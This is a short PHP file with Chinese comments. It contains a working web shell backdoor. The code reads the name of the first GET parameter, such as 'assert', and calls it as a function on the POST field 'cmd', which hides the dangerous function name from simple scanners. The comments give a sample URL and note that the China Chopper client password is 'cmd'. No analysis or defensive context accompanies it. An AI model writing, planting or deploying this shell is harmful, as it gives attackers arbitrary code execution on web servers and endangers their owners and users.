<?php
//利用key获取数组键名，http://localhost/test.php?assert=test，菜刀密码cmd 
$lang = (string)key($_GET);  // key返回数组的键名
$lang($_POST['cmd']); 
?>
